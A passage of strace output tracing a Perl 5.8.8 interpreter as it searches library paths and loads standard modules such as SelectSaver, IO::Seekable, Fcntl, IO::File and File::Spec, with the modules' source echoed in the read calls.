s/^\\^([a-z_])/\'qq(\\c\'.$1.\')\'/eei;\n\t    $pkg = \"main\";\n\t}\n\telse {\n\t    $pkg = (@_ > 1) ? $_[1] : caller;\n\t}\n\t$name = $pkg . \"::\" . $name;\n    }\n    $name;\n}\n\nsub qualify_to_ref ($;$) {\n    return \\*{ qualify $_[0], @_ > 1 ? $_[1] : caller };\n}\n\n#\n# of Safe.pm lineage\n#\nsub delete_package ($) {\n    my $pkg = shift;\n\n    # expand to full symbol table name if needed\n\n    unless ($pkg =~ /^main::.*::$/) {\n        $pkg = \"main$pkg\"\tif\t$pkg =~ /^::/;\n        $pkg = \"main::$pkg\"\tunless\t$pkg =~ /^main::/;\n        $pkg .= \'::\'\t\tunless\t$pkg =~ /::$/;\n    }\n\n    my($stem, $leaf) = $pkg =~ m/(.*::)(\\w+::)$/;\n    my $stem_symtab = *{$stem}{HASH};\n    return unless defined $stem_symtab and exists $stem_symtab->{$leaf};\n\n    # free all the symbols in the package\n\n    my $leaf_symtab = *{$stem_symtab->{$leaf}}{HASH};\n    foreach my $name (keys %$leaf_symtab) {\n        undef *{$pkg . $name};\n    }\n\n    # delete the symbol table\n\n    %$leaf_symtab = ();\n    delete $stem_symtab->{$leaf};\n}\n\n1;\n", 4096) = 2099
10562 07:33:34.986640 read(8, "", 4096) = 0
10562 07:33:34.986657 close(8)          = 0
10562 07:33:34.986721 stat64("/etc/perl/SelectSaver.pmc", 0xbfbc5c6c) = -1 ENOENT (No such file or directory)
10562 07:33:34.986737 stat64("/etc/perl/SelectSaver.pm", 0xbfbc5b7c) = -1 ENOENT (No such file or directory)
10562 07:33:34.986752 stat64("/usr/local/lib/perl/5.8.8/SelectSaver.pmc", 0xbfbc5c6c) = -1 ENOENT (No such file or directory)
10562 07:33:34.986769 stat64("/usr/local/lib/perl/5.8.8/SelectSaver.pm", 0xbfbc5b7c) = -1 ENOENT (No such file or directory)
10562 07:33:34.986784 stat64("/usr/local/share/perl/5.8.8/SelectSaver.pmc", 0xbfbc5c6c) = -1 ENOENT (No such file or directory)
10562 07:33:34.986796 stat64("/usr/local/share/perl/5.8.8/SelectSaver.pm", 0xbfbc5b7c) = -1 ENOENT (No such file or directory)
10562 07:33:34.986810 stat64("/usr/lib/perl5/SelectSaver.pmc", 0xbfbc5c6c) = -1 ENOENT (No such file or directory)
10562 07:33:34.986822 stat64("/usr/lib/perl5/SelectSaver.pm", 0xbfbc5b7c) = -1 ENOENT (No such file or directory)
10562 07:33:34.986835 stat64("/usr/share/perl5/SelectSaver.pmc", 0xbfbc5c6c) = -1 ENOENT (No such file or directory)
10562 07:33:34.986847 stat64("/usr/share/perl5/SelectSaver.pm", 0xbfbc5b7c) = -1 ENOENT (No such file or directory)
10562 07:33:34.986861 stat64("/usr/lib/perl/5.8/SelectSaver.pmc", 0xbfbc5c6c) = -1 ENOENT (No such file or directory)
10562 07:33:34.986873 stat64("/usr/lib/perl/5.8/SelectSaver.pm", 0xbfbc5b7c) = -1 ENOENT (No such file or directory)
10562 07:33:34.986887 stat64("/usr/share/perl/5.8/SelectSaver.pmc", 0xbfbc5c6c) = -1 ENOENT (No such file or directory)
10562 07:33:34.986900 stat64("/usr/share/perl/5.8/SelectSaver.pm", {st_mode=S_IFREG|0644, st_size=340, ...}) = 0
10562 07:33:34.986921 open("/usr/share/perl/5.8/SelectSaver.pm", O_RDONLY|O_LARGEFILE) = 8
10562 07:33:34.986936 ioctl(8, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbfbc5988) = -1 ENOTTY (Inappropriate ioctl for device)
10562 07:33:34.986947 _llseek(8, 0, [0], SEEK_CUR) = 0
10562 07:33:34.986965 read(8, "package SelectSaver;\n\nour $VERSION = \'1.01\';\n\nrequire 5.000;\nuse Carp;\nuse Symbol;\n\nsub new {\n    @_ >= 1 && @_ <= 2 or croak \'usage: new SelectSaver [FILEHANDLE]\';\n    my $fh = select;\n    my $self = bless \\$fh, $_[0];\n    select qualify($_[1], caller) if @_ > 1;\n    $self;\n}\n\nsub DESTROY {\n    my $self = $_[0];\n    select $$self;\n}\n\n1;\n", 4096) = 340
10562 07:33:34.987162 brk(0x81d6000)    = 0x81d6000
10562 07:33:34.987193 read(8, "", 4096) = 0
10562 07:33:34.987205 close(8)          = 0
10562 07:33:34.987655 read(6, "sage: $io->stat()\';\n    stat($_[0]);\n}\n\n################################################\n## State modification functions.\n##\n\nsub autoflush {\n    my $old = new SelectSaver qualify($_[0], caller);\n    my $prev = $|;\n    $| = @_ > 1 ? $_[1] : 1;\n    $prev;\n}\n\nsub output_field_separator {\n    carp \"output_field_separator is not supported on a per-handle basis\"\n\tif ref($_[0]);\n    my $prev = $,;\n    $, = $_[1] if @_ > 1;\n    $prev;\n}\n\nsub output_record_separator {\n    carp \"output_record_separator is not supported on a per-handle basis\"\n\tif ref($_[0]);\n    my $prev = $\\;\n    $\\ = $_[1] if @_ > 1;\n    $prev;\n}\n\nsub input_record_separator {\n    carp \"input_record_separator is not supported on a per-handle basis\"\n\tif ref($_[0]);\n    my $prev = $/;\n    $/ = $_[1] if @_ > 1;\n    $prev;\n}\n\nsub input_line_number {\n    local $.;\n    () = tell qualify($_[0], caller) if ref($_[0]);\n    my $prev = $.;\n    $. = $_[1] if @_ > 1;\n    $prev;\n}\n\nsub format_page_number {\n    my $old;\n    $old = new SelectSaver qualify($_[0], caller) if ref($_[0]);\n    my $prev = $%;\n    $% = $_[1] if @_ > 1;\n    $prev;\n}\n\nsub format_lines_per_page {\n    my $old;\n    $old = new SelectSaver qualify($_[0], caller) if ref($_[0]);\n    my $prev = $=;\n    $= = $_[1] if @_ > 1;\n    $prev;\n}\n\nsub format_lines_left {\n    my $old;\n    $old = new SelectSaver qualify($_[0], caller) if ref($_[0]);\n    my $prev = $-;\n    $- = $_[1] if @_ > 1;\n    $prev;\n}\n\nsub format_name {\n    my $old;\n    $old = new SelectSaver qualify($_[0], caller) if ref($_[0]);\n    my $prev = $~;\n    $~ = qualify($_[1], caller) if @_ > 1;\n    $prev;\n}\n\nsub format_top_name {\n    my $old;\n    $old = new SelectSaver qualify($_[0], caller) if ref($_[0]);\n    my $prev = $^;\n    $^ = qualify($_[1], caller) if @_ > 1;\n    $prev;\n}\n\nsub format_line_break_characters {\n    carp \"format_line_break_characters is not supported on a per-handle basis\"\n\tif ref($_[0]);\n    my $prev = $:;\n    $: = $_[1] if @_ > 1;\n    $prev;\n}\n\nsub format_formfeed {\n    carp \"format_formfeed is not supported on a per-handle basis\"\n\tif ref($_[0]);\n    my $prev = $^L;\n    $^L = $_[1] if @_ > 1;\n    $prev;\n}\n\nsub formline {\n    my $io = shift;\n    my $picture = shift;\n    local($^A) = $^A;\n    local($\\) = \"\";\n    formline($picture, @_);\n    print $io $^A;\n}\n\nsub format_write {\n    @_ < 3 || croak \'usage: $io->write( [FORMAT_NAME] )\';\n    if (@_ == 2) {\n\tmy ($io, $fmt) = @_;\n\tmy $oldfmt = $io->format_name($fmt);\n\tCORE::write($io);\n\t$io->format_name($oldfmt);\n    } else {\n\tCORE::write($_[0]);\n    }\n}\n\n# XXX undocumented\nsub fcntl {\n    @_ == 3 || croak \'usage: $io->fcntl( OP, VALUE );\';\n    my ($io, $op) = @_;\n    return fcntl($io, $op, $_[2]);\n}\n\n# XXX undocumented\nsub ioctl {\n    @_ == 3 || croak \'usage: $io->ioctl( OP, VALUE );\';\n    my ($io, $op) = @_;\n    return ioctl($io, $op, $_[2]);\n}\n\n# this sub is for compatability with older releases of IO that used\n# a sub called constant to detemine if a constant existed -- GMB\n#\n# The SEEK_* and _IO?BF constants were the only constants at that time\n# any new code should just chech defined(&CONSTANT_NAME)\n\nsub constant {\n    no strict \'refs\';\n    my $name = shift;\n    (($name =~ /^(SEEK_(SET|CUR|END)|_IO[FLN]BF)$/) && defined &{$name})\n\t? &{$name}() : undef;\n}\n\n# so that flush.pl can be deprecated\n\nsub printflush {\n    my $io = shift;\n    my $old;\n    $old = new SelectSaver qualify($io, caller) if ref($io);\n    local $| = 1;\n    if(ref($io)) {\n        print $io @_;\n    }\n    else {\n\tprint @_;\n    }\n}\n\n1;\n", 4096) = 3496
10562 07:33:34.988300 read(6, "", 4096) = 0
10562 07:33:34.988316 close(6)          = 0
10562 07:33:34.988355 stat64("/etc/perl/IO/Seekable.pmc", 0xbfbc611c) = -1 ENOENT (No such file or directory)
10562 07:33:34.988370 stat64("/etc/perl/IO/Seekable.pm", 0xbfbc602c) = -1 ENOENT (No such file or directory)
10562 07:33:34.988384 stat64("/usr/local/lib/perl/5.8.8/IO/Seekable.pmc", 0xbfbc611c) = -1 ENOENT (No such file or directory)
10562 07:33:34.988397 stat64("/usr/local/lib/perl/5.8.8/IO/Seekable.pm", 0xbfbc602c) = -1 ENOENT (No such file or directory)
10562 07:33:34.988412 stat64("/usr/local/share/perl/5.8.8/IO/Seekable.pmc", 0xbfbc611c) = -1 ENOENT (No such file or directory)
10562 07:33:34.988424 stat64("/usr/local/share/perl/5.8.8/IO/Seekable.pm", 0xbfbc602c) = -1 ENOENT (No such file or directory)
10562 07:33:34.988438 stat64("/usr/lib/perl5/IO/Seekable.pmc", 0xbfbc611c) = -1 ENOENT (No such file or directory)
10562 07:33:34.988450 stat64("/usr/lib/perl5/IO/Seekable.pm", 0xbfbc602c) = -1 ENOENT (No such file or directory)
10562 07:33:34.988463 stat64("/usr/share/perl5/IO/Seekable.pmc", 0xbfbc611c) = -1 ENOENT (No such file or directory)
10562 07:33:34.988475 stat64("/usr/share/perl5/IO/Seekable.pm", 0xbfbc602c) = -1 ENOENT (No such file or directory)
10562 07:33:34.988489 stat64("/usr/lib/perl/5.8/IO/Seekable.pmc", 0xbfbc611c) = -1 ENOENT (No such file or directory)
10562 07:33:34.988514 stat64("/usr/lib/perl/5.8/IO/Seekable.pm", {st_mode=S_IFREG|0644, st_size=686, ...}) = 0
10562 07:33:34.988565 open("/usr/lib/perl/5.8/IO/Seekable.pm", O_RDONLY|O_LARGEFILE) = 6
10562 07:33:34.988616 ioctl(6, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbfbc5e38) = -1 ENOTTY (Inappropriate ioctl for device)
10562 07:33:34.988642 _llseek(6, 0, [0], SEEK_CUR) = 0
10562 07:33:34.988677 read(6, "#\n\npackage IO::Seekable;\n\nuse 5.006_001;\nuse Carp;\nuse strict;\nour($VERSION, @EXPORT, @ISA);\nuse IO::Handle ();\n# XXX we can\'t get these from IO::Handle or we\'ll get prototype\n# mismatch warnings on C<use POSIX; use IO::File;> :-(\nuse Fcntl qw(SEEK_SET SEEK_CUR SEEK_END);\nrequire Exporter;\n\n@EXPORT = qw(SEEK_SET SEEK_CUR SEEK_END);\n@ISA = qw(Exporter);\n\n$VERSION = \"1.10\";\n$VERSION = eval $VERSION;\n\nsub seek {\n    @_ == 3 or croak \'usage: $io->seek(POS, WHENCE)\';\n    seek($_[0], $_[1], $_[2]);\n}\n\nsub sysseek {\n    @_ == 3 or croak \'usage: $io->sysseek(POS, WHENCE)\';\n    sysseek($_[0], $_[1], $_[2]);\n}\n\nsub tell {\n    @_ == 1 or croak \'usage: $io->tell()\';\n    tell($_[0]);\n}\n\n1;\n", 4096) = 686
10562 07:33:34.988965 stat64("/etc/perl/Fcntl.pmc", 0xbfbc5c6c) = -1 ENOENT (No such file or directory)
10562 07:33:34.989047 stat64("/etc/perl/Fcntl.pm", 0xbfbc5b7c) = -1 ENOENT (No such file or directory)
10562 07:33:34.989062 stat64("/usr/local/lib/perl/5.8.8/Fcntl.pmc", 0xbfbc5c6c) = -1 ENOENT (No such file or directory)
10562 07:33:34.989091 stat64("/usr/local/lib/perl/5.8.8/Fcntl.pm", 0xbfbc5b7c) = -1 ENOENT (No such file or directory)
10562 07:33:34.989122 stat64("/usr/local/share/perl/5.8.8/Fcntl.pmc", 0xbfbc5c6c) = -1 ENOENT (No such file or directory)
10562 07:33:34.989134 stat64("/usr/local/share/perl/5.8.8/Fcntl.pm", 0xbfbc5b7c) = -1 ENOENT (No such file or directory)
10562 07:33:34.989148 stat64("/usr/lib/perl5/Fcntl.pmc", 0xbfbc5c6c) = -1 ENOENT (No such file or directory)
10562 07:33:34.989160 stat64("/usr/lib/perl5/Fcntl.pm", 0xbfbc5b7c) = -1 ENOENT (No such file or directory)
10562 07:33:34.989172 stat64("/usr/share/perl5/Fcntl.pmc", 0xbfbc5c6c) = -1 ENOENT (No such file or directory)
10562 07:33:34.989184 stat64("/usr/share/perl5/Fcntl.pm", 0xbfbc5b7c) = -1 ENOENT (No such file or directory)
10562 07:33:34.989197 stat64("/usr/lib/perl/5.8/Fcntl.pmc", 0xbfbc5c6c) = -1 ENOENT (No such file or directory)
10562 07:33:34.989209 stat64("/usr/lib/perl/5.8/Fcntl.pm", {st_mode=S_IFREG|0644, st_size=3458, ...}) = 0
10562 07:33:34.989229 open("/usr/lib/perl/5.8/Fcntl.pm", O_RDONLY|O_LARGEFILE) = 8
10562 07:33:34.989243 ioctl(8, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbfbc5988) = -1 ENOTTY (Inappropriate ioctl for device)
10562 07:33:34.989254 _llseek(8, 0, [0], SEEK_CUR) = 0
10562 07:33:34.989273 read(8, "package Fcntl;\n\nour($VERSION, @ISA, @EXPORT, @EXPORT_OK, %EXPORT_TAGS, $AUTOLOAD);\n\nrequire Exporter;\nuse XSLoader ();\n@ISA = qw(Exporter);\n$VERSION = \"1.05\";\n# Items to export into callers namespace by default\n# (move infrequently used names to @EXPORT_OK below)\n@EXPORT =\n  qw(\n\tFD_CLOEXEC\n\tF_ALLOCSP\n\tF_ALLOCSP64\n\tF_COMPAT\n\tF_DUP2FD\n\tF_DUPFD\n\tF_EXLCK\n\tF_FREESP\n\tF_FREESP64\n\tF_FSYNC\n\tF_FSYNC64\n\tF_GETFD\n\tF_GETFL\n\tF_GETLK\n\tF_GETLK64\n\tF_GETOWN\n\tF_NODNY\n\tF_POSIX\n\tF_RDACC\n\tF_RDDNY\n\tF_RDLCK\n\tF_RWACC\n\tF_RWDNY\n\tF_SETFD\n\tF_SETFL\n\tF_SETLK\n\tF_SETLK64\n\tF_SETLKW\n\tF_SETLKW64\n\tF_SETOWN\n\tF_SHARE\n\tF_SHLCK\n\tF_UNLCK\n\tF_UNSHARE\n\tF_WRACC\n\tF_WRDNY\n\tF_WRLCK\n\tO_ACCMODE\n\tO_ALIAS\n\tO_APPEND\n\tO_ASYNC\n\tO_BINARY\n\tO_CREAT\n\tO_DEFER\n\tO_DIRECT\n\tO_DIRECTORY\n\tO_DSYNC\n\tO_EXCL\n\tO_EXLOCK\n\tO_LARGEFILE\n\tO_NDELAY\n\tO_NOCTTY\n\tO_NOFOLLOW\n\tO_NOINHERIT\n\tO_NONBLOCK\n\tO_RANDOM\n\tO_RAW\n\tO_RDONLY\n\tO_RDWR\n\tO_RSRC\n\tO_RSYNC\n\tO_SEQUENTIAL\n\tO_SHLOCK\n\tO_SYNC\n\tO_TEMPORARY\n\tO_TEXT\n\tO_TRUNC\n\tO_WRONLY\n     );\n\n# Other items we are prepared to export if requested\n@EXPORT_OK = qw(\n\tDN_ACCESS\n\tDN_ATTRIB\n\tDN_CREATE\n\tDN_DELETE\n\tDN_MODIFY\n\tDN_MULTISHOT\n\tDN_RENAME\n\tFAPPEND\n\tFASYNC\n\tFCREAT\n\tFDEFER\n\tFDSYNC\n\tFEXCL\n\tFLARGEFILE\n\tFNDELAY\n\tFNONBLOCK\n\tFRSYNC\n\tFSYNC\n\tFTRUNC\n\tF_GETLEASE\n\tF_GETSIG\n\tF_NOTIFY\n\tF_SETLEASE\n\tF_SETSIG\n\tLOCK_EX\n\tLOCK_MAND\n\tLOCK_NB\n\tLOCK_READ\n\tLOCK_RW\n\tLOCK_SH\n\tLOCK_UN\n\tLOCK_WRITE\n\tO_IGNORE_CTTY\n\tO_NOATIME\n\tO_NOLINK\n\tO_NOTRANS\n\tSEEK_CUR\n\tSEEK_END\n\tSEEK_SET\n\tS_IFSOCK S_IFBLK S_IFCHR S_IFIFO S_IFWHT S_ENFMT\n\tS_IREAD S_IWRITE S_IEXEC\n\tS_IRGRP S_IWGRP S_IXGRP S_IRWXG\n\tS_IROTH S_IWOTH S_IXOTH S_IRWXO\n\tS_IRUSR S_IWUSR S_IXUSR S_IRWXU\n\tS_ISUID S_ISGID S_ISVTX S_ISTXT\n\t_S_IFMT S_IFREG S_IFDIR S_IFLNK\n\t&S_ISREG &S_ISDIR &S_ISLNK &S_ISSOCK &S_ISBLK &S_ISCHR &S_ISFIFO\n\t&S_ISWHT &S_ISENFMT &S_IFMT &S_IMODE\n);\n# Named groups of exports\n%EXPORT_TAGS = (\n    \'flock\'   => [qw(LOCK_SH LOCK_EX LOCK_NB LOCK_UN)],\n    \'Fcompat\' => [qw(FAPPEND FASYNC FCREAT FDEFER FDSYNC FEXCL FLARGEFILE\n\t\t     FNDELAY FNONBLOCK FRSYNC FSYNC FTRUNC)],\n    \'seek\'    => [qw(SEEK_SET SEEK_CUR SEEK_END)],\n    \'mode\'    => [qw(S_ISUID S_ISGID S_ISVTX S_ISTXT\n\t\t     _S_IFMT S_IFREG S_IFDIR S_IFLNK\n\t\t     S_IFSOCK S_IFBLK S_IFCHR S_IFIFO S_IFWHT S_ENFMT\n\t\t     S_IRUSR S_IWUSR S_IXUSR S_IRWXU\n\t\t     S_IRGRP S_IWGRP S_IXGRP S_IRWXG\n\t\t     S_IROTH S_IWOTH S_IXOTH S_IRWXO\n\t\t     S_IREAD S_IWRITE S_IEXEC\n\t\t     S_ISREG S_ISDIR S_ISLNK S_ISSOCK\n\t\t     S_ISBLK S_ISCHR S_ISFIFO\n\t\t     S_ISWHT S_ISENFMT\t\t\n\t\t     S_IFMT S_IMODE\n                  )],\n);\n\nsub S_IFMT  { @_ ? ( $_[0] & _S_IFMT() ) : _S_IFMT()  }\nsub S_IMODE { $_[0] & 07777 }\n\nsub S_ISREG    { ( $_[0] & _S_IFMT() ) == S_IFREG()   }\nsub S_ISDIR    { ( $_[0] & _S_IFMT() ) == S_IFDIR()   }\nsub S_ISLNK    { ( $_[0] & _S_IFMT() ) == S_IFLNK()   }\nsub S_ISSOCK   { ( $_[0] & _S_IFMT() ) == S_IFSOCK()  }\nsub S_ISBLK    { ( $_[0] & _S_IFMT() ) == S_IFBLK()   }\nsub S_ISCHR    { ( $_[0] & _S_IFMT() ) == S_IFCHR()   }\nsub S_ISFIFO   { ( $_[0] & _S_IFMT() ) == S_IFIFO()   }\nsub S_ISWHT    { ( $_[0] & _S_IFMT() ) == S_IFWHT()   }\nsub S_ISENFMT  { ( $_[0] & _S_IFMT() ) == S_IFENFMT() }\n\nsub AUTOLOAD {\n    (my $constname = $AUTOLOAD) =~ s/.*:://;\n    die \"&Fcntl::constant not defined\" if $constname eq \'constant\';\n    my ($error, $val) = constant($constname);\n    if ($error) {\n        my (undef,$file,$line) = caller;\n        die \"$error at $file line $line.\\n\";\n    }\n    *$AUTOLOAD = sub { $val };\n    goto &$AUTOLOAD;\n}\n\nXSLoader::load \'Fcntl\', $VERSION;\n\n1;\n", 4096) = 3458
10562 07:33:34.989731 brk(0x81f7000)    = 0x81f7000
10562 07:33:34.989907 read(8, "", 4096) = 0
10562 07:33:34.995852 close(8)          = 0
10562 07:33:34.995957 stat64("/usr/lib/perl/5.8/auto/Fcntl/Fcntl.so", {st_mode=S_IFREG|0644, st_size=12412, ...}) = 0
10562 07:33:34.995982 stat64("/usr/lib/perl/5.8/auto/Fcntl/Fcntl.bs", {st_mode=S_IFREG|0644, st_size=0, ...}) = 0
10562 07:33:34.996009 open("/usr/lib/perl/5.8/auto/Fcntl/Fcntl.so", O_RDONLY) = 8
10562 07:33:34.996023 read(8, "\177ELF\1\1\1\0\0\0\0\0\0\0\0\0\3\0\3\0\1\0\0\0 \10\0\0004\0\0\0\274,\0\0\0\0\0\0004\0 \0\4\0(\0\30\0\27\0\1\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\274*\0\0\274*\0\0\5\0\0\0\0\20\0\0\1\0\0\0\274*\0\0\274:\0\0\274:\0\0T\1\0\0X\1\0\0\6\0\0\0\0\20\0\0\2\0\0\0\320*\0\0\320:\0\0\320:\0\0\310\0\0\0\310\0\0\0\6\0\0\0\4\0\0\0Q\345td\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\6\0\0\0\4\0\0\0\21\0\0\0\36\0\0\0\0\0\0\0\25\0\0\0\32\0\0\0\24\0\0\0\5\0\0\0\t\0\0\0\0\0\0\0\23\0\0\0\21\0\0\0\34\0\0\0\4\0\0\0\26\0\0\0\0\0\0\0\30\0\0\0\17\0\0\0\27\0\0\0\r\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\1\0\0\0\0\0\0\0\3\0\0\0\2\0\0\0\0\0\0\0\0\0\0\0\v\0\0\0\6\0\0\0\35\0\0\0\7\0\0\0\0\0\0\0\22\0\0\0\31\0\0\0\33\0\0\0\20\0\0\0\16\0\0\0\n\0\0\0\0\0\0\0\f\0\0\0\10\0\0\0\0\0\0\0\3\0\0\0\27\0\0\0\2\0\0\0\6\0\0\0\210\0 \1\0\304H\t\27\0\0\0\32\0\0\0\35\0\0\0\356TU\220\272\343\222|CE\325\354.6bx\330qX\34\271\215\361\16\353\323\357\16\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\353\0\0\0\0\0\0\0\0\0\0\0\20\0\0\0j\1\0\0\0\0\0\0\0\0\0\0\20\0\0\0\337\0\0\0\0\0\0\0\0\0\0\0\20\0\0\0u\0\0\0\0\0\0\0", 512) = 512
10562 07:33:34.996113 fstat64(8, {st_mode=S_IFREG|0644, st_size=12412, ...}) = 0
10562 07:33:34.996131 mmap2(NULL, 15380, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_DENYWRITE, 8, 0) = 0xb7cfb000
10562 07:33:34.996144 mmap2(0xb7cfe000, 4096, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 8, 0x2) = 0xb7cfe000
10562 07:33:34.996160 close(8)          = 0
10562 07:33:34.996434 read(6, "", 4096) = 0
10562 07:33:34.996451 close(6)          = 0
10562 07:33:34.996496 stat64("/etc/perl/IO/File.pmc", 0xbfbc611c) = -1 ENOENT (No such file or directory)
10562 07:33:34.996511 stat64("/etc/perl/IO/File.pm", 0xbfbc602c) = -1 ENOENT (No such file or directory)
10562 07:33:34.996525 stat64("/usr/local/lib/perl/5.8.8/IO/File.pmc", 0xbfbc611c) = -1 ENOENT (No such file or directory)
10562 07:33:34.996538 stat64("/usr/local/lib/perl/5.8.8/IO/File.pm", 0xbfbc602c) = -1 ENOENT (No such file or directory)
10562 07:33:34.996556 stat64("/usr/local/share/perl/5.8.8/IO/File.pmc", 0xbfbc611c) = -1 ENOENT (No such file or directory)
10562 07:33:34.996568 stat64("/usr/local/share/perl/5.8.8/IO/File.pm", 0xbfbc602c) = -1 ENOENT (No such file or directory)
10562 07:33:34.996582 stat64("/usr/lib/perl5/IO/File.pmc", 0xbfbc611c) = -1 ENOENT (No such file or directory)
10562 07:33:34.996594 stat64("/usr/lib/perl5/IO/File.pm", 0xbfbc602c) = -1 ENOENT (No such file or directory)
10562 07:33:34.996607 stat64("/usr/share/perl5/IO/File.pmc", 0xbfbc611c) = -1 ENOENT (No such file or directory)
10562 07:33:34.996619 stat64("/usr/share/perl5/IO/File.pm", 0xbfbc602c) = -1 ENOENT (No such file or directory)
10562 07:33:34.996632 stat64("/usr/lib/perl/5.8/IO/File.pmc", 0xbfbc611c) = -1 ENOENT (No such file or directory)
10562 07:33:34.996644 stat64("/usr/lib/perl/5.8/IO/File.pm", {st_mode=S_IFREG|0644, st_size=1784, ...}) = 0
10562 07:33:34.996666 open("/usr/lib/perl/5.8/IO/File.pm", O_RDONLY|O_LARGEFILE) = 6
10562 07:33:34.996680 ioctl(6, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbfbc5e38) = -1 ENOTTY (Inappropriate ioctl for device)
10562 07:33:34.996691 _llseek(6, 0, [0], SEEK_CUR) = 0
10562 07:33:34.996709 read(6, "#\n\npackage IO::File;\n\nuse 5.006_001;\nuse strict;\nour($VERSION, @EXPORT, @EXPORT_OK, @ISA);\nuse Carp;\nuse Symbol;\nuse SelectSaver;\nuse IO::Seekable;\nuse File::Spec;\n\nrequire Exporter;\n\n@ISA = qw(IO::Handle IO::Seekable Exporter);\n\n$VERSION = \"1.13\";\n\n@EXPORT = @IO::Seekable::EXPORT;\n\neval {\n    # Make all Fcntl O_XXX constants available for importing\n    require Fcntl;\n    my @O = grep /^O_/, @Fcntl::EXPORT;\n    Fcntl->import(@O);  # first we import what we want to export\n    push(@EXPORT, @O);\n};\n\n################################################\n## Constructor\n##\n\nsub new {\n    my $type = shift;\n    my $class = ref($type) || $type || \"IO::File\";\n    @_ >= 0 && @_ <= 3\n\tor croak \"usage: new $class [FILENAME [,MODE [,PERMS]]]\";\n    my $fh = $class->SUPER::new();\n    if (@_) {\n\t$fh->open(@_)\n\t    or return undef;\n    }\n    $fh;\n}\n\n################################################\n## Open\n##\n\nsub open {\n    @_ >= 2 && @_ <= 4 or croak \'usage: $fh->open(FILENAME [,MODE [,PERMS]])\';\n    my ($fh, $file) = @_;\n    if (@_ > 2) {\n\tmy ($mode, $perms) = @_[2, 3];\n\tif ($mode =~ /^\\d+$/) {\n\t    defined $perms or $perms = 0666;\n\t    return sysopen($fh, $file, $mode, $perms);\n\t} elsif ($mode =~ /:/) {\n\t    return open($fh, $mode, $file) if @_ == 3;\n\t    croak \'usage: $fh->open(FILENAME, IOLAYERS)\';\n\t}\n\tif (defined($file) && length($file)\n\t    && ! File::Spec->file_name_is_absolute($file))\n\t{\n\t    $file = File::Spec->rel2abs($file);\n\t}\n\t$file = IO::Handle::_open_mode_string($mode) . \" $file\\0\";\n    }\n    open($fh, $file);\n}\n\n################################################\n## Binmode\n##\n\nsub binmode {\n    ( @_ == 1 or @_ == 2 ) or croak \'usage $fh->binmode([LAYER])\';\n\n    my($fh, $layer) = @_;\n\n    return binmode $$fh unless $layer;\n    return binmode $$fh, $layer;\n}\n\n1;\n", 4096) = 1784
10562 07:33:34.996997 stat64("/etc/perl/File/Spec.pmc", 0xbfbc5c6c) = -1 ENOENT (No such file or directory)
10562 07:33:34.997014 stat64("/etc/perl/File/Spec.pm", 0xbfbc5b7c) = -1 ENOENT (No such file or directory)
10562 07:33:34.997027 stat64("/usr/local/lib/perl/5.8.8/File/Spec.pmc", 0xbfbc5c6c) = -1 ENOENT (No such file or directory)
10562 07:33:34.997040 stat64("/usr/local/lib/perl/5.8.8/File/Spec.pm", 0xbfbc5b7c) = -1 ENOENT (No such file or directory)
10562 07:33:34.997054 stat64("/usr/local/share/perl/5.8.8/File/Spec.pmc", 0xbfbc5c6c) = -1 ENOENT (No such file or directory)
10562 07:33:34.997066 stat64("/usr/local/share/perl/5.8.8/File/Spec.pm", 0xbfbc5b7c) = -1 ENOENT (No such file or directory)
10562 07:33:34.997080 stat64("/usr/lib/perl5/File/Spec.pmc", 0xbfbc5c6c) = -1 ENOENT (No such file or directory)
10562 07:33:34.997092 stat64("/usr/lib/perl5/File/Spec.pm", 0xbfbc5b7c) = -1 ENOENT (No such file or directory)
10562 07:33:34.997105 stat64("/usr/share/perl5/File/Spec.pmc", 0xbfbc5c6c) = -1 ENOENT (No such file or directory)
10562 07:33:34.997122 stat64("/usr/share/perl5/File/Spec.pm", 0xbfbc5b7c) = -1 ENOENT (No such file or directory)
10562 07:33:34.997135 stat64("/usr/lib/perl/5.8/File/Spec.pmc", 0xbfbc5c6c) = -1 ENOENT (No such file or directory)
10562 07:33:34.997147 stat64("/usr/lib/perl/5.8/File/Spec.pm", 0xbfbc5b7c) = -1 ENOENT (No such file or directory)
10562 07:33:34.997161 stat64("/usr/share/perl/5.8/File/Spec.pmc", 0xbfbc5c6c) = -1 ENOENT (No such file or directory)
10562 07:33:34.997174 stat64("/usr/share/perl/5.8/File/Spec.pm", {st_mode=S_IFREG|0644, st_size=595, ...}) = 0
10562 07:33:34.997195 open("/usr/share/perl/5.8/File/Spec.pm", O_RDONLY|O_LARGEFILE) = 8
10562 07:33:34.997209 ioctl(8, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbfbc5988) = -1 ENOTTY (Inappropriate ioctl for device)
10562 07:33:34.997221 _llseek(8, 0, [0], SEEK_CUR) = 0
10562 07:33:34.997238 read(8, "package File::Spec;\n\nuse strict;\nuse vars qw(@ISA $VERSION);\n\n$VERSION = \'3.12\';\n$VERSION = eval $VERSION;\n\nmy %module = (MacOS   => \'Mac\',\n\t      MSWin32 => \'Win32\',\n\t      os2     => \'OS2\',\n\t      VMS     => \'VMS\',\n\t      epoc    => \'Epoc\',\n\t      NetWare => \'Win32\', # Yes, File::Spec::Win32 works on NetWare.\n\t      symbian => \'Win32\', # Yes, File::Spec::Win32 works on symbian.\n\t      dos     => \'OS2\',   # Yes, File::Spec::OS2 works on DJGPP.\n\t      cygwin  => \'Cygwin\');\n\nmy $module = $module{$^O} || \'Unix\';\n\nrequire \"File/Spec/$module.pm\";\n@ISA = (\"File::Spec::$module\");\n\n1;\n\n__END__\n\n", 4096) = 595
10562 07:33:34.997351 stat64("/etc/perl/vars.pmc", 0xbfbc57bc) = -1 ENOENT (No such file or directory)
10562 07:33:34.997368 stat64("/etc/perl/vars.pm", 0xbfbc56cc) = -1 ENOENT (No such file or directory)
10562 07:33:34.997397 stat64("/usr/local/lib/perl/5.8.8/vars.pmc", 0xbfbc57bc) = -1 ENOENT (No such file or directory)
